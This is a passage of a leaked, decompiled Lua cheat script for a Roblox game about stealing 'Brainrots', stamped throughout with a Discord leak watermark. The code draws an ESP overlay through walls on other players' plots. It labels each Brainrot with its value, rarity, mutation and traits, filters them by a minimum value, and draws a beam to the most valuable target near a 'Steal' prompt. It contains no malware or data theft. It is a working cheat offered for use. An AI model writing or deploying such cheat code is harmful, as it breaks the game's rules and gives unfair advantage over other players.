				mutationRow.Shadow.Text = sliced19.Text:gsub("<[^<>]->", "")
			end)
		end

		slicedfn20 = function(arg, arg2)
			if not tbl7.Rarity then  -- LEAKED BY SLICED | discord.gg/pubmethod
				arg.RarityShown = false
				arg.RarityRow.Holder.Visible = false
				slicedfn41(arg)
				return
			end

			if arg2 < (arg.RarityCheckedAt or 0) then
				arg.RarityRow.Holder.Visible = arg.RarityShown == true
				return
			end
			arg.RarityCheckedAt = arg2 + 0.5  -- LEAKED BY SLICED | discord.gg/pubmethod
			local text = slicedfn31(arg.Model.Name)
			local sliced19 = slicedfn34(arg)
			local rarity = sliced19 and sliced19:FindFirstChild("Rarity")

			if rarity and rarity:IsA("TextLabel") and rarity.Visible and rarity.Text ~= "" then
				text = rarity.Text
			end

			if not text or text == "" then
				arg.RarityShown = false
				arg.RarityRow.Holder.Visible = false
				slicedfn41(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end

			arg.RarityShown = true
			local rarityRow = arg.RarityRow
			rarityRow.Holder.Visible = true
			rarityRow.Label.Text = text
			rarityRow.Shadow.Text = text:gsub("<[^<>]->", "")
			local gradientPreset = tbl16[text]
			gradientPreset = gradientPreset and gradientPreset.GradientPreset
			local flag12 = false  -- LEAKED BY SLICED | discord.gg/pubmethod

			pcall(function()
				if gradientPreset and flag11 and flag11.apply then
					if arg.ActiveRarityEffect ~= gradientPreset then
						if arg.RarityGradientCleanup then
							pcall(arg.RarityGradientCleanup)
							arg.RarityGradientCleanup = nil
						end

						arg.ActiveRarityEffect = gradientPreset

						local ok4, rarityGradientCleanup = pcall(function()
							return flag11.apply(rarityRow.Label, gradientPreset)  -- LEAKED BY SLICED | discord.gg/pubmethod
						end)

						if ok4 and typeof(rarityGradientCleanup) == "function" then
							arg.RarityGradientCleanup = rarityGradientCleanup
						end
					end

					pcall(function()
						rarityRow.Label.TextColor3 = Color3.fromRGB(255, 255, 255)
					end)

					arg.SourceRarityGrad = nil
					flag12 = true  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end)

			if not flag12 then
				pcall(function()
					if arg.RarityGradientCleanup then
						pcall(arg.RarityGradientCleanup)
						arg.RarityGradientCleanup = nil
					end

					arg.ActiveRarityEffect = nil
					local uiGradient = rarity and rarity:FindFirstChildOfClass("UIGradient")  -- LEAKED BY SLICED | discord.gg/pubmethod
					local uiStroke = rarity and rarity:FindFirstChildOfClass("UIStroke")

					if uiGradient then
						rarityRow.TextGradient.Color = uiGradient.Color
						rarityRow.TextGradient.Rotation = uiGradient.Rotation
						rarityRow.TextGradient.Offset = uiGradient.Offset
						rarityRow.TextGradient.Enabled = true
						arg.SourceRarityGrad = uiGradient
					else
						rarityRow.TextGradient.Enabled = false
						arg.SourceRarityGrad = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
					end

					if uiStroke then
						rarityRow.Stroke.Color = uiStroke.Color
					else
						rarityRow.Stroke.Color = Color3.fromRGB(0, 0, 0)
					end

					if rarity and rarity.TextColor3 then
						rarityRow.Label.TextColor3 = rarity.TextColor3
					elseif text == "Mythic" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(255, 0, 0)  -- LEAKED BY SLICED | discord.gg/pubmethod
					elseif text == "Legendary" or text == "Legend" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(255, 175, 0)
					elseif text == "Epic" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(134, 0, 171)
					elseif text == "Rare" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(0, 131, 171)
					elseif text == "Common" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(0, 171, 40)
					else
						rarityRow.Label.TextColor3 = Color3.fromRGB(130, 210, 255)  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
				end)
			end
		end

		slicedfn21 = function(arg, arg2)
			if not tbl7.Trails then
				arg.TraitRow.Holder.Visible = false
				return
			end

			if arg2 < (arg.TraitCheckedAt or 0) then  -- LEAKED BY SLICED | discord.gg/pubmethod
				arg.TraitRow.Holder.Visible = arg.TraitIcons ~= nil
				return
			end
			arg.TraitCheckedAt = arg2 + 0.5
			local sliced19, sliced20 = slicedfn38(arg.Model, arg.Root, slicedfn34(arg))
			arg.ActiveTraitNames = sliced20

			if not sliced19 then
				arg.TraitIcons = nil
				arg.TraitRow.Holder.Visible = false
				arg.TraitRow.CurrentKey = ""  -- LEAKED BY SLICED | discord.gg/pubmethod

				for _, icon in ipairs(arg.TraitRow.Icons) do
					icon.Visible = false
				end

				return
			end

			arg.TraitIcons = sliced19
			arg.TraitRow.Holder.Visible = true
			local currentKey = table.concat(sliced19, "|")

			if arg.TraitRow.CurrentKey ~= currentKey then
				arg.TraitRow.CurrentKey = currentKey  -- LEAKED BY SLICED | discord.gg/pubmethod
				local slicedn8 = math.floor(18 * slicedn2)

				for i_ = 1, #sliced19 do
					local imageLabel = arg.TraitRow.Icons[i_]

					if not imageLabel then
						imageLabel = Instance.new("ImageLabel")
						imageLabel.BackgroundTransparency = 1
						imageLabel.ScaleType = Enum.ScaleType.Fit
						imageLabel.ImageColor3 = Color3.fromRGB(255, 255, 255)
						imageLabel.ZIndex = 3
						imageLabel.Parent = arg.TraitRow.Holder  -- LEAKED BY SLICED | discord.gg/pubmethod
						arg.TraitRow.Icons[i_] = imageLabel
					end

					imageLabel.Image = sliced19[i_]
					imageLabel.Size = UDim2.fromOffset(slicedn8, slicedn8)
					imageLabel.LayoutOrder = i_
					imageLabel.Visible = true
				end

				for i_ = #sliced19 + 1, #arg.TraitRow.Icons do
					arg.TraitRow.Icons[i_].Visible = false
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
		end

		slicedfn22 = function(arg, arg2)
			if arg2 < (arg.GenerationCheckedAt or 0) then
				return
			end
			arg.GenerationCheckedAt = arg2 + 0.4
			local mutation = slicedfn34(arg)
			local text = mutation and mutation:FindFirstChild("Generation") and mutation.Generation.Text
			mutation = mutation and mutation:FindFirstChild("Mutation")  -- LEAKED BY SLICED | discord.gg/pubmethod
			local text2

			if mutation and mutation.Visible and mutation.Text ~= "" then
				text2 = mutation.Text
			else
				local attribute = arg.Model:GetAttribute("Mutation") or arg.Model:GetAttribute("__mutation")
				local flag12 = attribute and tostring(attribute) ~= ""
				text2 = nil

				if flag12 then
					text2 = tostring(attribute)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			local activeTraitNames = arg.ActiveTraitNames

			if not activeTraitNames then
				local sliced19
				sliced19, activeTraitNames = slicedfn38(arg.Model, arg.Root)
				arg.ActiveTraitNames = activeTraitNames
			end

			local sliced19 = slicedfn37(arg.Name, text2, activeTraitNames, text)

			if sliced19 ~= arg.Generation and sliced19 > 0 then
				arg.Generation = sliced19  -- LEAKED BY SLICED | discord.gg/pubmethod
				local sliced20 = slicedfn32(sliced19)
				arg.ValueRow.Label.Text = sliced20
				arg.ValueRow.Shadow.Text = sliced20
				local sliced21 = slicedfn30(sliced19)
				arg.NameRow.TextGradient.Color = sliced21.Text
				arg.NameRow.StrokeGradient.Color = sliced21.Stroke
				arg.Highlight.FillColor = sliced21.Outline
				arg.Highlight.OutlineColor = sliced21.Outline
				arg.BeamTint = sliced21.Outline
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		slicedfn23 = function(arg, arg2)
			if flag4 then
				return arg2
			end
			return (arg.Generation or 0) >= slicedn3
		end

		attachment = nil
		local attachment4 = nil
		local beam3 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		local beam4 = nil
		sliced13 = nil
		sliced14 = nil

		slicedfn24 = function()
			pcall(function()
				if beam3 then
					beam3:Destroy()
				end
			end)

			pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				if beam4 then
					beam4:Destroy()
				end
			end)

			pcall(function()
				if attachment then
					attachment:Destroy()
				end
			end)

			pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				if attachment4 then
					attachment4:Destroy()
				end
			end)

			beam3 = nil
			beam4 = nil
			attachment = nil
			attachment4 = nil
			sliced13 = nil
			sliced14 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		slicedfn25 = function(parent, parent2)
			slicedfn24()
			if not (parent and parent2) then
				return
			end
			attachment = Instance.new("Attachment")
			attachment.Name = "BrainrotBeamStart"
			attachment.Position = Vector3.new(0, 1, 0)
			attachment.Parent = parent  -- LEAKED BY SLICED | discord.gg/pubmethod
			attachment4 = Instance.new("Attachment")
			attachment4.Name = "BrainrotBeamTarget"
			attachment4.Position = Vector3.new(0, 2.5, 0)
			attachment4.Parent = parent2
			local color2 = Color3.fromRGB(255, 25, 140)
			local color3 = Color3.fromRGB(255, 120, 220)
			local color4 = Color3.fromRGB(180, 35, 255)
			beam3 = Instance.new("Beam")
			beam3.Name = "BrainrotBeamGlow"
			beam3.Attachment0 = attachment  -- LEAKED BY SLICED | discord.gg/pubmethod
			beam3.Attachment1 = attachment4
			beam3.Color = ColorSequence.new(color2, color4)
			beam3.CurveSize0 = 1.8
			beam3.CurveSize1 = -1.8
			beam3.FaceCamera = true
			beam3.LightEmission = 0.55
			beam3.Segments = 20
			beam3.Transparency = NumberSequence.new(0.65)
			beam3.Width0 = 0.42
			beam3.Width1 = 0.6  -- LEAKED BY SLICED | discord.gg/pubmethod
			obj[beam3] = true
			beam3.Parent = attachment
			beam4 = Instance.new("Beam")
			beam4.Name = "BrainrotBeamCore"
			beam4.Attachment0 = attachment
			beam4.Attachment1 = attachment4
			local sliced19 = beam4
			local colorSequence = ColorSequence.new
			local tbl20 = {}
			local sliced20 = ColorSequenceKeypoint.new(0, color2)  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced21 = ColorSequenceKeypoint.new(0.5, color3)
			local new = ColorSequenceKeypoint.new
			tbl20[1] = sliced20
			tbl20[2] = sliced21

			do
				local values = table.pack(new(1, color4))
				table.move(values, 1, values.n, 3, tbl20)
			end

			sliced19.Color = colorSequence(tbl20)
			beam4.CurveSize0 = 1.8  -- LEAKED BY SLICED | discord.gg/pubmethod
			beam4.CurveSize1 = -1.8
			beam4.FaceCamera = true
			beam4.LightEmission = 0.6
			beam4.Segments = 20
			beam4.Transparency = NumberSequence.new(0.04)
			beam4.Width0 = 0.12
			beam4.Width1 = 0.22
			obj[beam4] = true
			beam4.Parent = attachment4
			sliced13 = parent  -- LEAKED BY SLICED | discord.gg/pubmethod
			sliced14 = parent2
		end

		slicedfn26 = function(arg)
			slicedfn41(arg)

			pcall(function()
				arg.Billboard:Destroy()
			end)

			pcall(function()
				arg.Highlight:Destroy()
			end)  -- LEAKED BY SLICED | discord.gg/pubmethod

			if sliced14 == arg.Root then
				slicedfn24()
			end
		end
	end

	slicedfn27 = function()
		for k, sliced19 in pairs(tbl6) do
			slicedfn26(sliced19)
			tbl6[k] = nil
		end  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	slicedn4 = 14

	do
		local sliced19 = nil
		local obj2 = setmetatable({}, { __mode = "k" })

		slicedfn28 = function(arg)
			if sliced19 and sliced19.Parent then
				return arg == sliced19
			end
			local plotSign = arg and arg:FindFirstChild("PlotSign")  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not plotSign then
				return false
			end
			local sliced20 = string.lower(localPlayer.Name)
			local sliced21 = string.lower(localPlayer.DisplayName)

			for _, descendant in ipairs(plotSign:GetDescendants()) do
				if descendant:IsA("TextLabel") then
					local sliced22 = string.lower(tostring(descendant.Text or ""))
					if sliced22 == "your base" or string.find(sliced22, sliced20, 1, true) or string.find(sliced22, sliced21, 1, true) then
						sliced19 = arg  -- LEAKED BY SLICED | discord.gg/pubmethod
						return true
					end
				end
			end

			return false
		end

		local function slicedfn31(arg, arg2)
			local sliced20 = obj2[arg]
			if sliced20 and sliced20.Parent and tostring(sliced20.ActionText) == "Steal" then
				return sliced20  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
			obj2[arg] = nil

			for _, descendant in ipairs(arg2:GetDescendants()) do
				if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == "Steal" then
					obj2[arg] = descendant
					return descendant
				end
			end

			return nil
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		slicedfn29 = function(arg)
			local tbl17 = {}
			local animalPodiums = arg and arg:FindFirstChild("AnimalPodiums")
			if not animalPodiums then
				return tbl17
			end

			for _, child in ipairs(animalPodiums:GetChildren()) do
				local base = child:FindFirstChild("Base")
				base = base and base:FindFirstChild("Spawn")

				if base and base:IsA("BasePart") then  -- LEAKED BY SLICED | discord.gg/pubmethod
					local sliced20 = slicedfn31(child, base:FindFirstChild("PromptAttachment") or base)

					if sliced20 then
						local str = tostring(sliced20.ObjectText or "")

						if str ~= "" then
							local tbl18 = tbl17[str]

							if not tbl18 then
								tbl18 = {}
								tbl17[str] = tbl18
							end

							tbl18[#tbl18 + 1] = base.Position  -- LEAKED BY SLICED | discord.gg/pubmethod
						end
					end
				end
			end

			return tbl17
		end
	end
end

do
	local function slicedfn30(arg, arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
		if not (arg and arg2) then
			return false
		end

		for _, sliced15 in ipairs(arg2) do
			if (arg.Position - sliced15).Magnitude <= slicedn4 then
				return true
			end
		end

		return false
	end  -- LEAKED BY SLICED | discord.gg/pubmethod

	local function slicedfn31()
		local plots = Workspace:FindFirstChild("Plots")
		if not plots then
			slicedfn27()
			return
		end
		local tbl9 = {}

		for _, child in ipairs(plots:GetChildren()) do
			if not slicedfn28(child) then
				local sliced15 = slicedfn29(child)  -- LEAKED BY SLICED | discord.gg/pubmethod

				for _, child2 in ipairs(child:GetChildren()) do
					if child2:IsA("Model") and tbl4[child2.Name] then
						local sliced16 = slicedfn16(child2)

						if slicedfn30(sliced16, sliced15[child2.Name]) then
							tbl9[child2] = true
							local sliced17 = tbl6[child2]

							if sliced17 and sliced17.Root ~= sliced16 then
								slicedfn26(sliced17)
								sliced17 = nil
							end  -- LEAKED BY SLICED | discord.gg/pubmethod

							if not sliced17 then
								local sliced18 = slicedfn17(child2, sliced16)
								tbl6[child2] = sliced18
								slicedfn18(sliced18)
							end
						end
					end
				end
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		for k, sliced15 in pairs(tbl6) do
			if not tbl9[k] or not k.Parent then
				slicedfn26(sliced15)
				tbl6[k] = nil
			end
		end
	end

	local function slicedfn32()
		if not flag2 then
			return  -- LEAKED BY SLICED | discord.gg/pubmethod
		end
		flag2 = false
		slicedfn6(tbl5)
		slicedfn24()
		slicedfn27()
	end

	local function slicedfn33()
		if flag2 then
			return
		end  -- LEAKED BY SLICED | discord.gg/pubmethod
		flag2 = true
		slicedfn31()
		local slicedn5 = 0

		tbl5[#tbl5 + 1] = RunService.RenderStepped:Connect(function()
			if not flag2 then
				return
			end
			local now = os.clock()

			if slicedn5 <= now then
				slicedn5 = now + 1  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn31()
			end

			local generation = nil
			local sliced15 = nil

			for _, sliced16 in pairs(tbl6) do
				if sliced16.Root.Parent then
					local flag5 = flag4

					if not flag4 then
						flag5 = (sliced16.Generation or 0) >= slicedn3
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if flag5 and (not generation or sliced16.Generation > generation) then
						generation = sliced16.Generation
						sliced15 = sliced16
					end
				end
			end

			for _, sliced16 in pairs(tbl6) do
				local sliced17 = slicedfn23(sliced16, sliced16 == sliced15)
				sliced16.Billboard.Enabled = sliced17
				sliced16.Highlight.Enabled = sliced17  -- LEAKED BY SLICED | discord.gg/pubmethod

				if sliced17 then
					sliced16.NameRow.Holder.Visible = tbl7.Name
					sliced16.ValueRow.Holder.Visible = tbl7.Value
					pcall(slicedfn20, sliced16, now)
					pcall(slicedfn19, sliced16, now)
					pcall(slicedfn21, sliced16, now)
					pcall(slicedfn22, sliced16, now)

					if tbl7.Rarity and sliced16.SourceRarityGrad and sliced16.SourceRarityGrad.Parent then
						pcall(function()
							sliced16.RarityRow.TextGradient.Offset = sliced16.SourceRarityGrad.Offset  -- LEAKED BY SLICED | discord.gg/pubmethod
							sliced16.RarityRow.TextGradient.Rotation = sliced16.SourceRarityGrad.Rotation
							sliced16.RarityRow.TextGradient.Color = sliced16.SourceRarityGrad.Color
						end)
					end

					if tbl7.Mutation and sliced16.SourceMutationGrad and sliced16.SourceMutationGrad.Parent then
						pcall(function()
							sliced16.MutationRow.TextGradient.Offset = sliced16.SourceMutationGrad.Offset
							sliced16.MutationRow.TextGradient.Rotation = sliced16.SourceMutationGrad.Rotation
							sliced16.MutationRow.TextGradient.Color = sliced16.SourceMutationGrad.Color
						end)  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
				end
			end

			local sliced16 = slicedfn7()
			local sliced17 = flag3
			local sliced18

			if flag3 then
				sliced18 = sliced15
			else
				sliced18 = sliced17  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if not (sliced18 and sliced16) then
				if attachment then
					slicedfn24()
				end
			else
				local flag5 = sliced13 ~= sliced16 or sliced14 ~= sliced15.Root

				if not flag5 then
					flag5 = not (attachment and attachment.Parent)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				if flag5 then
					slicedfn25(sliced16, sliced15.Root, sliced15.BeamTint)
				end
			end
		end)
	end

	sliced12.Event:Connect(slicedfn32)
	chilliBrainrotESPRuntime.Destroying:Connect(slicedfn32)

	local sliced15 = sliced9:CreateToggle({
		Name = "Brainrot ESP",  -- LEAKED BY SLICED | discord.gg/pubmethod
		Default = true,
		Callback = function(arg)
			if arg then
				slicedfn33()
			else
				slicedfn32()
			end
		end,
	})

	sliced9:CreateSlider({  -- LEAKED BY SLICED | discord.gg/pubmethod
		Name = "Brainrot ESP Size",
		Min = 50,
		Max = 200,
		Default = 100,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		Quick = false,
		SubOf = sliced15,
		Callback = function(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedn2 = math.clamp((tonumber(arg) or 100) / 100, 0.5, 2)

			for _, sliced16 in pairs(tbl6) do
				slicedfn18(sliced16)
			end
		end,
	})

	sliced9:CreateMultiDropdown({
		Name = "Show Information",
		Note = "Choose what each Brainrot tag shows.",
		Options = { "Name", "Mutation", "Value", "Trails", "Rarity" },  -- LEAKED BY SLICED | discord.gg/pubmethod
		Default = { "Name", "Value", "Trails" },
		Quick = false,
		SubOf = sliced15,
		Callback = function(arg)
			local tbl9 = { Name = false, Mutation = false, Value = false, Trails = false, Rarity = false }

			if type(arg) == "table" then
				for k, sliced16 in pairs(arg) do
					if type(sliced16) == "string" then
						if tbl9[sliced16] ~= nil then
							tbl9[sliced16] = true  -- LEAKED BY SLICED | discord.gg/pubmethod
						elseif sliced16 == "Type" then
							tbl9.Rarity = true
						end
					elseif type(k) == "string" and sliced16 == true then
						if tbl9[k] ~= nil then
							tbl9[k] = true
						elseif k == "Type" then
							tbl9.Rarity = true
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end

			tbl7 = tbl9
		end,
	})

	local sliced16 = nil
	local slicedn5 = 1
	local str = "M/s"

	local function slicedfn34(arg, arg2)
		if arg ~= nil then  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedn5 = math.floor(tonumber(arg) or slicedn5)
		end

		if arg2 ~= nil then
			str = tostring(arg2)
		elseif sliced16 and sliced16.GetUnit then
			local unit = sliced16:GetUnit()

			if unit and unit ~= "" then
				str = tostring(unit)
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		slicedn3 = slicedn5 * (tbl8[str] or tbl8["M/s"]).Mult
	end

	local function slicedfn35(arg)
		str = arg
		local ms = tbl8[arg] or tbl8["M/s"]

		if sliced16 and sliced16.SetRange then
			sliced16:SetRange(ms.Min, ms.Max)
			local min = sliced16:Get() or ms.Min
			local min2 = ms.Min
			local max = ms.Max  -- LEAKED BY SLICED | discord.gg/pubmethod
			local slicedn6 = math.clamp(math.floor(min + 0.5), min2, max)

			if slicedn6 ~= min then
				sliced16:Set(slicedn6)
			else
				slicedfn34(slicedn6, arg)
			end
		else
			slicedfn34(nil, arg)
		end
	end  -- LEAKED BY SLICED | discord.gg/pubmethod

	sliced16 = sliced9:CreateSlider({
		Name = "Brainrot ESP Min Value",
		Note = "Filters out Brainrots below this threshold. Tap arrow to change unit (K/s, M/s, B/s).",
		Min = 0,
		Max = 1000,
		Default = 1,
		AllowDecimals = false,
		Increment = 1,
		Unit = {
			Default = "M/s",  -- LEAKED BY SLICED | discord.gg/pubmethod
			Selector = true,
			Options = { "K/s", "M/s", "B/s" },
			ColorEnabled = true,
			Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
			Callback = function(arg)
				slicedfn35(arg)
			end,
		},
		Quick = false,
		SubOf = sliced15,  -- LEAKED BY SLICED | discord.gg/pubmethod
		Callback = function(arg)
			slicedfn34(arg, nil)
		end,
	})

	sliced9:CreateToggle({
		Name = "Best Brainrot Only",
		Default = true,
		Quick = false,
		SubOf = sliced15,
		Callback = function(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag4 = arg == true
		end,
	})

	sliced9:CreateToggle({
		Name = "Beam To Best",
		Note = "Draws one beam from you to the highest generation Brainrot.",
		Default = true,
		Quick = false,
		SubOf = sliced15,
		Callback = function(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag3 = arg == true
		end,
	})
end

local str = "__ChilliBrainrotNotificationRuntime"
local slicedn5 = 0.75
local slicedn6 = 3
local chilliBrainrotNotificationRuntim, sliced15
chilliBrainrotNotificationRuntim, sliced15 = slicedfn5("__ChilliBrainrotNotificationRuntime")
local flag5 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
local str2 = ""
local soundId = ""
local str3 = ""
local slicedn7 = 1000000
local flag6 = true
local slicedn8 = 0
local slicedn9 = 0
local connection = nil
local obj2 = setmetatable({}, { __mode = "k" })
local sliced16 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
local tbl9, sliced17, sliced18, TweenService, font, tbl10, tbl11, tbl12
local sliced19 = nil
tbl9 = {}
sliced17 = nil
sliced18 = nil
TweenService = game:GetService("TweenService")
font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
tbl10 = {}
tbl11 = {}
tbl12 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod

pcall(function()
	local Animals = require(ReplicatedStorage.Datas.Animals)

	if type(Animals) == "table" then
		tbl10 = Animals
	end
end)

pcall(function()
	local Mutations = require(ReplicatedStorage.Datas.Mutations)

	if type(Mutations) == "table" then
		tbl11 = Mutations  -- LEAKED BY SLICED | discord.gg/pubmethod
	end
end)

pcall(function()
	local Traits = require(ReplicatedStorage.Datas.Traits)

	if type(Traits) == "table" then
		tbl12 = Traits
	end
end)

pcall(function()
	local Gradients = require(ReplicatedStorage.Packages.Gradients)  -- LEAKED BY SLICED | discord.gg/pubmethod

	if type(Gradients) == "table" then
		sliced19 = Gradients
	end
end)

local tbl13 = {}

do
	local tbl14 = { Preset = "Zebra", Background = Color3.fromRGB(16, 16, 20) }
	local colorSequence = ColorSequence.new
	local tbl15 = {}
	local sliced20 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))  -- LEAKED BY SLICED | discord.gg/pubmethod
	local sliced21 = ColorSequenceKeypoint.new(0.24, Color3.fromRGB(45, 45, 55))
	local sliced22 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
	local sliced23 = ColorSequenceKeypoint.new(0.76, Color3.fromRGB(45, 45, 55))
	tbl15[1] = sliced20
	tbl15[2] = sliced21
	tbl15[3] = sliced22
	tbl15[4] = sliced23

	do
		local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)))
		table.move(values, 1, values.n, 5, tbl15)  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	tbl14.Colors = colorSequence(tbl15)
	tbl13["Secret Zebra"] = tbl14
end

local slicedfn30, slicedfn31

do
	local function slicedfn32()
		if sliced16 then
			return sliced16
		end  -- LEAKED BY SLICED | discord.gg/pubmethod
		local controllers = ReplicatedStorage:FindFirstChild("Controllers")
		controllers = controllers and controllers:FindFirstChild("NotificationController")
		if not (controllers and controllers:IsA("ModuleScript")) then
			return nil
		end
		local ok, result = pcall(require, controllers)

		if ok and type(result) == "table" then
			sliced16 = result
		end

		return sliced16  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	local function slicedfn33(arg)
		local match = tostring(arg or ""):match("(%d+)")
		if match and tonumber(match) and tonumber(match) > 0 then
			return "rbxassetid://" .. match
		end
		return nil
	end

	local function slicedfn34(arg)
		if not arg then  -- LEAKED BY SLICED | discord.gg/pubmethod
			return nil
		end

		if arg:IsA("Sound") then
			return slicedfn33(arg.SoundId)
		end

		if arg:IsA("StringValue") then
			local sliced20 = slicedfn33(arg.Value)
			if sliced20 then
				return sliced20
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local sliced20 = slicedfn33(arg:GetAttribute("SoundId"))
		if sliced20 then
			return sliced20
		end
		local sound = arg:FindFirstChildWhichIsA("Sound", true)
		return sound and slicedfn33(sound.SoundId) or nil
	end

	local function slicedfn35()
		local ipairs = ipairs  -- LEAKED BY SLICED | discord.gg/pubmethod
		local tbl14 = {}
		local sliced21 = table.pack(game:GetService("SoundService"))
		tbl14[1] = ReplicatedStorage

		do
			local values = table.pack(table.unpack(sliced21, 1, sliced21.n))
			table.move(values, 1, values.n, 2, tbl14)
		end

		for _, sliced22 in ipairs(tbl14) do
			local crystalSpawn = sliced22:FindFirstChild("CrystalSpawn", true)
			local sliced23 = slicedfn34(crystalSpawn)  -- LEAKED BY SLICED | discord.gg/pubmethod
			if sliced23 then
				return sliced23
			end
		end

		return ""
	end

	slicedfn30 = function(arg)
		str2 = tostring(arg or "")
	end

	slicedfn31 = function()  -- LEAKED BY SLICED | discord.gg/pubmethod
		local sliced20 = slicedfn33(str2)

		if not sliced20 then
			soundId = str3
			v.Notify("Sound ID Failed", "Invalid asset ID. Restored the default Crystal sound.", 5)
			return false
		end

		local sound = Instance.new("Sound")
		sound.Name = "ChilliSoundIdValidation"
		sound.SoundId = sliced20
		sound.Volume = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
		sound.Parent = game:GetService("SoundService")
		local flag7 = false

		local isLoaded = pcall(function()
			game:GetService("ContentProvider"):PreloadAsync({ sound }, function(arg, arg2)
				if arg2 == Enum.AssetFetchStatus.Success then
					flag7 = true
				end
			end)
		end) and (flag7 or sound.IsLoaded or sound.TimeLength > 0)

		sound:Destroy()  -- LEAKED BY SLICED | discord.gg/pubmethod

		if not isLoaded then
			soundId = str3
			v.Notify("Sound ID Failed", "Audio unavailable. Restored the default Crystal sound.", 5)
			return false
		end

		soundId = sliced20
		str2 = sliced20
		v.Notify("Sound ID Applied", sliced20 .. " is now used for Brainrot notifications.", 5)
		return true
	end  -- LEAKED BY SLICED | discord.gg/pubmethod

	local function slicedfn36()
		if soundId == "" then
			return
		end
		local sound = Instance.new("Sound")
		sound.Name = "ChilliBrainrotNotificationSound"
		sound.SoundId = soundId
		sound.Volume = 1
		sound.Parent = game:GetService("SoundService")

		if not pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
			sound:Play()
		end) then
			sound:Destroy()
			return
		end

		game:GetService("Debris"):AddItem(sound, 15)
	end

	str3 = slicedfn35()
	soundId = str3
	str2 = soundId  -- LEAKED BY SLICED | discord.gg/pubmethod

	local function slicedfn37(parent, arg)
		local uiGradient = Instance.new("UIGradient")
		uiGradient.Color = arg.Colors
		uiGradient.Rotation = 8
		uiGradient.Parent = parent
		local tween = TweenService:Create(uiGradient, TweenInfo.new(1.8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), { Rotation = 368 })
		tween:Play()

		return function()
			tween:Cancel()
		end  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	local function slicedfn38(arg, parent, name, text, position, size, textSize)
		local clone = arg:Clone()
		clone.Name = name
		clone.Visible = true
		clone.RichText = true
		clone.BackgroundTransparency = 1
		clone.AutomaticSize = Enum.AutomaticSize.None
		clone.AnchorPoint = Vector2.zero
		clone.Position = position  -- LEAKED BY SLICED | discord.gg/pubmethod
		clone.Size = size
		clone.Text = text
		clone.TextScaled = false
		clone.TextSize = textSize
		clone.TextXAlignment = Enum.TextXAlignment.Left
		clone.TextYAlignment = Enum.TextYAlignment.Center
		clone.FontFace = font
		clone.Parent = parent
		return clone
	end  -- LEAKED BY SLICED | discord.gg/pubmethod

	local function slicedfn39(parent, arg, arg2)
		if not (arg2 and arg2.Parent) then
			return false
		end

		local ok, result = pcall(function()
			return arg2:Clone()
		end)

		if not ok or not result then
			return false
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		for _, descendant in ipairs(result:GetDescendants()) do
			if descendant:IsA("ParticleEmitter") or descendant:IsA("Beam") or descendant:IsA("Trail") or descendant:IsA("Light") or descendant:IsA("Sound") or descendant:IsA("Script") or descendant:IsA("LocalScript") then
				descendant:Destroy()
			end
		end

		local worldModel = Instance.new("WorldModel")
		worldModel.Parent = parent
		result.Parent = worldModel

		pcall(function()
			result:PivotTo(CFrame.new())  -- LEAKED BY SLICED | discord.gg/pubmethod
		end)

		local cframe = CFrame.new()

		local ok2, result2, result3 = pcall(function()
			return result:GetBoundingBox()
		end)

		ok2 = ok2 and result2 and result3
		local vector = Vector3.new(4, 4, 4)

		if not ok2 then
			result3 = vector
			result2 = cframe  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local position = result2.Position
		local slicedn10 = math.max(math.max(result3.X, result3.Y, result3.Z) * 1.35, 3.5)
		arg.FieldOfView = 40
